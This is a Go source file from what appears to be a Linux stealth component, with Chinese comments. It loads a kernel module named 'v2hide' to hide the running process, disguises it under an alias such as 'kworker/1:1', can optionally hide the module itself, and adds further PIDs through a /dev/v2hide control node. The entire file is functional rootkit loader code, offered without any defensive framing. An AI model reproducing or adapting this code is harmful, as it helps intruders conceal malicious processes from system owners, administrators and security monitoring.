//go:build linux

package stealth

import (
	"errors"
	"fmt"
	"os"
	"os/exec"
	"strconv"
	"strings"

	"golang.org/x/sys/unix"
)

// 与 tools/linux-hide/v2hide.c 约定的模块名与设备节点
const (
	linuxModuleName = "v2hide"
	linuxDevicePath = "/dev/v2hide"
)

// kernelHide 在进程启动后立刻加载隐藏模块，把当前 pid 交给内核侧摘除。
func kernelHide(c Config) error {
	path := c.KernelModule
	if path == "" {
		path = "/etc/v2nb/" + linuxModuleName + ".ko"
	}
	if _, err := os.Stat(path); err != nil {
		return fmt.Errorf("模块不存在 %s: %w", path, err)
	}
	// 进程别名要传给 target_comm，不能盖到 dev_name 上：
	// dev_name 决定 /dev/<name> 设备节点，alias 里带 "/"（如 kworker/1:1）
	// 会让节点建不出来，/dev/v2hide 不存在，后续 kernelAddPID 全部失效。
	params := fmt.Sprintf("target_pid=%d target_comm=%s hide_module=%d",
		os.Getpid(), c.Alias, boolToInt(c.HideModule))

	err := finitModule(path, params)
	if err == nil {
		return nil
	}
	// 模块已在内核里（上一个进程没卸载干净，或安装脚本已加载过）。
	// 此时旧实例的 target_pid 可能指向已退出的进程，所以要主动把当前 pid
	// 追加进它的隐藏集合，否则本进程不会被隐藏。
	if errors.Is(err, unix.EEXIST) {
		if e := kernelAddPID(os.Getpid()); e == nil {
			return nil
		} else {
			return fmt.Errorf("模块已加载但无法把当前 pid 加入隐藏集合: %w", e)
		}
	}
	// 回退：某些内核/受限容器里 finit_module 会被拦，改用 kmod 的 insmod。
	// 注意 environ 已被清空、PATH 不在了，必须按绝对路径找工具。
	tool := findKmodTool("insmod")
	if tool == "" {
		return fmt.Errorf("finit_module: %v; 且 /sbin、/usr/sbin 下都找不到 insmod", err)
	}
	cmd := exec.Command(tool, append([]string{path}, strings.Fields(params)...)...)
	if out, e := cmd.CombinedOutput(); e != nil {
		msg := strings.TrimSpace(string(out))
		if strings.Contains(strings.ToLower(msg), "file exists") {
			return nil // 同名模块已加载
		}
		return fmt.Errorf("finit_module: %v; insmod: %v (%s)", err, e, msg)
	}
	return nil
}

// findKmodTool 按绝对路径找 kmod 工具：re-exec 清空 environ 之后 PATH 已失效，
// exec.Command 的隐式查找会直接失败。
func findKmodTool(name string) string {
	for _, dir := range []string{"/usr/sbin", "/sbin", "/usr/bin", "/bin"} {
		p := dir + "/" + name
		if st, err := os.Stat(p); err == nil && !st.IsDir() {
			return p
		}
	}
	if p, err := exec.LookPath(name); err == nil {
		return p
	}
	return ""
}

func finitModule(path, params string) error {
	f, err := os.Open(path)
	if err != nil {
		return err
	}
	defer f.Close()
	return unix.FinitModule(int(f.Fd()), params, 0)
}

// kernelUnhide 卸载模块：模块 exit 会恢复 dir_context->actor 与进程链表。
func kernelUnhide() error {
	if err := unix.DeleteModule(linuxModuleName, 0); err != nil {
		tool := findKmodTool("rmmod")
		if tool == "" {
			return fmt.Errorf("delete_module: %v; 且找不到 rmmod", err)
		}
		cmd := exec.Command(tool, linuxModuleName)
		if out, e := cmd.CombinedOutput(); e != nil {
			return fmt.Errorf("delete_module: %v; rmmod: %v (%s)", err, e, strings.TrimSpace(string(out)))
		}
	}
	return nil
}

// kernelAddPID 通过 /dev/v2hide 控制节点追加要隐藏的 pid。
func kernelAddPID(pid int) error {
	f, err := os.OpenFile(linuxDevicePath, os.O_WRONLY, 0)
	if err != nil {
		return err
	}
	defer f.Close()
	_, err = f.WriteString("add " + strconv.Itoa(pid))
	return err
}

func boolToInt(b bool) int {
	if b {
		return 1
	}
	return 0
}
